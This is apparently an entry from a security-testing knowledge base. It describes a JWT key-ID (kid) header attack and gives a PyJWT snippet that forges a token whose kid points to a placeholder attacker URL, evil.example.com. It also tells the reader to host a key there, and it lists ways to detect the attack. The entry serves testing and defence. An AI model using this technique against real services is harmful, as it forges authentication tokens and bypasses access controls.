---
type: code
language: py
verified: true
tags:
  - jwt
  - token-forgery
platforms:
  - Linux
  - macOS
  - Windows
validated: true
---

# python-jwt-encode-with-malicious-kid

## Code

```py
>>> jwt.encode(
...     {"some": "payload"},
...     "secret",
...     algorithm="HS256",
...     headers={"kid": "http://evil.example.com/custom.key"},
... )
```

## Description

This Python code snippet uses the PyJWT library to generate a JWT token with a manipulated 'kid' header pointing to an attacker-controlled external resource, allowing forgery of authentication tokens if the server insecurely resolves the key.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| payload | JWT claims dictionary | {"some": "payload", "sub": "user123"} |
| secret | Symmetric signing key | "mysecretkey" |
| algorithm | Signing algorithm | "HS256" |
| kid | Key ID header value (malicious) | "http://evil.example.com/custom.key" |

## Usage

Execute in a Python REPL or script after importing jwt (pip install PyJWT). Use to create forged tokens for testing JWT validation flaws in web applications. Host a custom key at the 'kid' URL to complete the attack.

## Detection

- Monitor for JWTs with unexpected 'kid' values referencing external domains or file paths.
- Log signing key resolutions and alert on failures or unusual sources.
- Use JWT libraries with strict 'kid' validation enabled.

## Related

- [[procedures/JWT-Key-ID-kid-Claim-Misuse]]
